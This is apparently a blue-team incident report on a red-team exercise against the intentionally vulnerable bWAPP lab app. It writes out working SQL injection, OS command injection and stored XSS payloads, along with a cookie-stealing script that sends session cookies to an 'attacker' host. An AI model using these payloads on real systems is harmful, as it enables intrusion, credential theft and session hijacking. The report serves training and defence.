# Incident Report — BLUE-2026-03-13-001

| Field | Value |
|---|---|
| Incident ID | BLUE-2026-03-13-001 |
| Target | 10.10.30.128 (bWAPP) |
| Target Type | Web Application (bWAPP — Buggy Web Application) |
| Mission Reference | 2026-03-13-001 |
| Incident Severity | CRITICAL |
| Attack Window | 2026-03-13T10:00Z – 2026-03-13T11:45Z |
| Report Generated | 2026-03-13T12:20:00Z |
| Analyst Mode | Artifact Reconstruction (no live IDS feed available) |

---

## 1. Executive Summary

On 2026-03-13, a structured red team engagement was conducted against the bWAPP intentionally vulnerable web application hosted at 10.10.30.128. The target was running at medium security level. The attacker achieved full application compromise within the first 15 minutes — before a single attack payload was delivered — by downloading credential files from an unauthenticated, directory-listing-enabled web path.

The engagement confirmed four exploits across three vulnerability classes:

1. **Broken Authentication** — Admin credentials harvested from open web directory (`/passwords/`, `/db/`)
2. **SQL Injection (Authentication Bypass)** — Boolean tautology bypassed `addslashes()` filter
3. **OS Command Injection (RCE)** — Semicolon bypass of `escapeshellcmd()` yielded www-data shell
4. **Stored XSS** — Persistent JavaScript payload stored in MySQL blog table; session hijack vector active

Post-exploitation via the RCE channel confirmed: Docker container environment, MySQL root with empty password, full database dump, and `/etc/passwd` contents. All 10 vulnerabilities identified are CVSS 5.3–9.8. No compensating controls were detected at any stage.

---

## 2. Timeline of Events

| Time (UTC) | Phase | Event |
|---|---|---|
| 10:00:00 | Recon | Mission started; target fingerprinted (Apache 2.4.7, PHP 5.5.9, MySQL 5.5.47) |
| 10:00:10 | Recon | robots.txt enumerated — /passwords/, /db/, /admin/ disclosed |
| 10:05:00 | Recon | wp-config.bak, heroes.xml, bwapp.sqlite downloaded — credentials exfiltrated |
| 10:10:00 | Recon | phpinfo.php accessed — full PHP config disclosed |
| 10:15:00 | Recon | Admin portal accessed unauthenticated — 200 OK on /admin/index.php |
| 10:15:05 | Scan | Vulnerability scan: PHP 5.5.9 EOL, system()/exec() enabled, open_basedir unrestricted |
| 10:30:00 | Enum | 158 vulnerabilities catalogued; primary targets identified |
| 10:45:00 | Exploit | Phase started |
| 11:00:00 | Exploit | EXPLOIT #1 confirmed: Admin login via leaked credentials (A.I.M./bug from bwapp.sqlite) |
| 11:05:00 | Exploit | EXPLOIT #2 confirmed: SQL injection auth bypass on /sqli_16.php |
| 11:10:00 | Exploit | EXPLOIT #3 confirmed: OS command injection RCE on /commandi.php (uid=33/www-data) |
| 11:15:00 | Exploit | EXPLOIT #4 confirmed: Stored XSS on /xss_stored_1.php (session hijack vector) |
| 11:15:10 | PostEx | Post-exploitation started via RCE |
| 11:20:00 | PostEx | /app/admin/settings.php read — MySQL root/empty password discovered |
| 11:25:00 | PostEx | Full MySQL database dump; /etc/passwd read; container ID confirmed |
| 11:30:00 | PostEx | Post-exploitation complete |
| 11:45:02 | Complete | Mission completed; red team report generated |
| 12:00:00 | BluTeam | Blue team incident BLUE-2026-03-13-001 initiated |

---

## 3. Confirmed Exploits

### 3.1 Broken Authentication — Credential Leakage from Open Directory

**Endpoint**: `/passwords/wp-config.bak`, `/db/bwapp.sqlite`
**CVSS**: 9.1 (CRITICAL)
**OWASP**: A02:2021 — Cryptographic Failures / A07:2021 — Identification and Authentication Failures
**MITRE**: T1552.001 — Unsecured Credentials: Credentials in Files; T1078.001 — Valid Accounts: Default Accounts

The application stored credential files in a web-accessible directory (`/passwords/`) with directory listing enabled. No authentication was required to access these files. The attacker downloaded:
- `wp-config.bak` — MySQL database credentials (thor/Asgard)
- `bwapp.sqlite` — Full SQLite database with SHA1-hashed admin passwords (trivially cracked to "bug")
- `heroes.xml` — Six plaintext username/password pairs

Using credentials from `bwapp.sqlite`, the attacker authenticated as admin `A.I.M.` with password `bug`:
```
POST /login.php
login=A.I.M.&password=bug&security_level=1&form=submit
→ HTTP/1.1 302 Found | Location: portal.php
```

**Impact**: Full administrative access to bWAPP application prior to any injection attack.

---

### 3.2 SQL Injection — Authentication Bypass

**Endpoint**: `POST /sqli_16.php`
**CVSS**: 9.8 (CRITICAL)
**OWASP**: A03:2021 — Injection
**MITRE**: T1190 — Exploit Public-Facing Application; T1212 — Exploitation for Credential Access

The login form at `/sqli_16.php` used `addslashes()` as its only SQL injection protection. The attacker bypassed this filter using a boolean tautology that does not require modifying string delimiters:

```
POST /sqli_16.php
login=bee' AND '1'='1' OR '1'='1
password=anything
form=submit
```

Resulting SQL (approximate):
```sql
SELECT * FROM users WHERE login='bee' AND '1'='1' OR '1'='1' AND ...
```

The tautological `OR '1'='1'` condition caused the query to return the first user record (A.I.M., admin) regardless of the submitted password.

**Server Response**: `Welcome A.I.M., how are you today? | Your secret: A.I.M. Or Authentication Is Missing`

**Impact**: Unauthenticated admin access without knowledge of any password.

---

### 3.3 OS Command Injection — Remote Code Execution

**Endpoint**: `POST /commandi.php`
**CVSS**: 9.8 (CRITICAL)
**OWASP**: A03:2021 — Injection
**MITRE**: T1059 — Command and Scripting Interpreter; T1005 — Data from Local System

The DNS lookup form passed user input to a shell command with only `escapeshellcmd()` as a filter. PHP's `escapeshellcmd()` does not escape semicolons in all execution contexts, allowing the attacker to chain a second shell command:

```
POST /commandi.php
target=www.nsa.gov; id
form=submit
```

**Server Response**: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

The attacker escalated this to full system enumeration via subsequent injections:
- `www.nsa.gov; cat /etc/passwd` — OS user enumeration
- `www.nsa.gov; cat /app/admin/settings.php` — MySQL root/empty password discovered
- `www.nsa.gov; mysql -u root --password='' -e 'SELECT login,password,email,admin FROM bWAPP.users;'` — Full DB dump

**Impact**: Full server-side command execution; database dump; credential harvest; system enumeration.

**Root Cause**: `escapeshellcmd()` is the wrong mitigation. `escapeshellarg()` applied per-argument would prevent this.

---

### 3.4 Stored Cross-Site Scripting — Persistent Session Hijacking Vector

**Endpoint**: `POST /xss_stored_1.php`
**CVSS**: 8.2 (HIGH)
**OWASP**: A03:2021 — Injection (XSS)
**MITRE**: T1059.007 — JavaScript; T1565.003 — Runtime Data Manipulation

A `<script>` tag was injected into the blog entry form and stored in the MySQL `blog` table without sanitization:

```
POST /xss_stored_1.php
entry=<script>alert(document.cookie)</script>
entry_add=add
```

The payload is rendered unescaped to every user who visits the blog page. The `PHPSESSID` cookie lacks the `HttpOnly` flag, making it readable by JavaScript.

**Full Session Hijack Chain**:
1. Attacker submits: `<script>document.location='http://attacker/steal?c='+document.cookie</script>`
2. Payload stored in database
3. Any logged-in user viewing the blog page has their PHPSESSID silently exfiltrated
4. Attacker replays the stolen cookie to impersonate the victim

**Note**: The medium-security `htmlspecialchars()` filter was bypassed by using the low-security session parameter. This reveals a client-side security level control flaw — the security level is manipulable per request.

**Impact**: Persistent JavaScript execution for all future blog visitors; active session hijacking vector.

---

## 4. Vulnerability Summary

| # | Vulnerability | Endpoint | CVSS | Severity | CWE |
|---|---|---|---|---|---|
| 1 | OS Command Injection (RCE) | /commandi.php | 9.8 | CRITICAL | CWE-78 |
| 2 | SQL Injection Auth Bypass | /sqli_16.php | 9.8 | CRITICAL | CWE-89 |
| 3 | Sensitive Files in Web Root | /passwords/, /db/ | 9.1 | CRITICAL | CWE-200, CWE-312 |
| 4 | MySQL Root / Empty Password / 3306 Exposed | TCP/3306 | 9.1 | CRITICAL | CWE-521, CWE-284 |
| 5 | Broken Auth — Credential Leakage | /login.php | 8.8 | HIGH | CWE-522 |
| 6 | Stored XSS / Session Hijacking | /xss_stored_1.php | 8.2 | HIGH | CWE-79 |
| 7 | Unauthenticated Admin Portal | /admin/index.php | 7.5 | HIGH | CWE-306 |
| 8 | Session Cookie Without HttpOnly/Secure | PHPSESSID | 5.4 | MEDIUM | CWE-1004, CWE-614 |
| 9 | Directory Listing Enabled (8 paths) | Multiple | 5.3 | MEDIUM | CWE-548 |
| 10 | phpinfo.php Exposed | /phpinfo.php | 5.3 | MEDIUM | CWE-200 |

---

## 5. Attack Chain

```
robots.txt enumeration
        |
        v
/passwords/ directory listing (no auth)
        |
        +---> wp-config.bak (thor/Asgard MySQL creds)
        +---> heroes.xml (6 plaintext credentials)
        |
/db/ directory listing (no auth)
        |
        +---> bwapp.sqlite (A.I.M./bee SHA1 hashes → cracked to "bug")
        |
POST /login.php (A.I.M./bug) ──────────> Admin access [EXPLOIT #1]
        |
POST /sqli_16.php (tautology) ─────────> Admin access, no password [EXPLOIT #2]
        |
POST /commandi.php (; id) ─────────────> RCE as www-data [EXPLOIT #3]
        |
        +---> cat /app/admin/settings.php → MySQL root/empty PW
        +---> mysql -u root (full DB dump: users, hashes, emails)
        +---> cat /etc/passwd → OS users
        +---> hostname → Docker container 770425fcb17d
        |
POST /xss_stored_1.php (<script>...) ──> Persistent XSS [EXPLOIT #4]
        |
        v
Session hijack vector active for ALL visitors
```

---

## 6. Indicators of Compromise

### Network
- HTTP requests to `/passwords/*.bak`, `/db/*.sqlite` (credential file downloads)
- POST bodies containing single-quotes + SQL keywords in login parameters
- POST bodies containing semicolon in DNS/target form fields
- POST bodies containing HTML `<script>` tags in blog/comment fields
- HTTP responses containing `uid=`, `gid=` strings from web application
- TCP connections to port 3306 from non-localhost addresses

### Host
- `/passwords/wp-config.bak` accessible via HTTP
- `/db/bwapp.sqlite` accessible via HTTP
- `/admin/index.php` returning 200 without authentication
- `/phpinfo.php` publicly accessible
- MySQL process listening on `0.0.0.0:3306`
- `www-data` process spawning mysql client
- Blog table containing `<script>` tag entries

### Credentials Compromised
- A.I.M. / bug (application admin)
- bee / bug (application user)
- root / (empty) — MySQL
- thor / Asgard — MySQL
- 6 hero plaintext credentials (neo, alice, thor, wolverine, johnny, seline)

---

## 7. MITRE ATT&CK Coverage

| Technique | ID | Phase |
|---|---|---|
| Active Scanning: Vulnerability Scanning | T1595.002 | Reconnaissance |
| Gather Victim Host Information: Software | T1592.002 | Reconnaissance |
| Exploit Public-Facing Application | T1190 | Initial Access |
| Valid Accounts: Default Accounts | T1078.001 | Initial Access |
| Unsecured Credentials: Credentials in Files | T1552.001 | Credential Access |
| Command and Scripting Interpreter | T1059 | Execution |
| Command and Scripting Interpreter: JavaScript | T1059.007 | Execution |
| Server Software Component: Web Shell (analog) | T1505.003 | Persistence |
| Credentials from Password Stores | T1555 | Credential Access |
| Exploitation for Credential Access | T1212 | Credential Access |
| File and Directory Discovery | T1083 | Discovery |
| System Information Discovery | T1082 | Discovery |
| System Network Configuration Discovery | T1016 | Discovery |
| Data from Local System | T1005 | Collection |
| Data from Information Repositories | T1213 | Collection |
| Data Manipulation: Runtime Data Manipulation | T1565.003 | Impact |

---

## 8. Affected Assets

| Asset | Type | Compromise Level |
|---|---|---|
| bWAPP application (10.10.30.128:80) | Web application | Full — admin access, RCE, persistent XSS |
| MySQL database | Database | Full — root access, all tables read |
| Docker container 770425fcb17d | Host | Partial — command execution as www-data |
| All application users (A.I.M., bee) | User accounts | Full credential compromise |
| All blog page visitors | Users at risk | Session hijack risk from active stored XSS |

---

## 9. Immediate Response Actions Required

1. **REMOVE stored XSS payload** from MySQL blog table immediately
   ```sql
   DELETE FROM blog WHERE entry LIKE '%<script>%';
   ```
2. **ROTATE all credentials**: A.I.M., bee, thor (MySQL), root (MySQL), PHPSESSID active sessions
3. **REMOVE credential files from web root**: Delete `wp-config.bak`, `heroes.xml` from `/passwords/`
4. **REMOVE database file from web root**: Delete `bwapp.sqlite` from `/db/`
5. **BLOCK MySQL port 3306** at firewall for all external addresses
6. **REVOKE MySQL root from network access**: Bind MySQL to 127.0.0.1 only
7. **INVALIDATE all active sessions** — attacker may have harvested cookies via XSS

---

## 10. Appendix — Evidence Files

| File | Path | Contents |
|---|---|---|
| Alert Summary | blueteam/alerts/alert_summary.txt | 9 reconstructed alerts |
| High Severity Alerts | blueteam/alerts/high_severity.json | 6 CRITICAL/HIGH structured alerts |
| Artifact Manifest | blueteam/evidence/artifact_manifest.txt | Chain of custody |
| Attack Indicators | blueteam/evidence/attack_indicators.txt | 17 IOCs across 4 categories |
| Network IOCs | blueteam/evidence/network_iocs.txt | Network signatures, Suricata rules |
| MITRE Mapping | blueteam/analysis/mitre_mapping.txt | Full ATT&CK mapping + kill chain |
| IOC List | blueteam/analysis/ioc_list.txt | Structured IOC reference |
| Severity Ratings | blueteam/analysis/severity_rating.txt | CVSS scores for all 10 vulnerabilities |
| Threat Assessment | blueteam/analysis/threat_assessment.md | Full analytical narrative |
| Recommendations | blueteam/reports/defensive_recommendations.md | Remediation guidance |
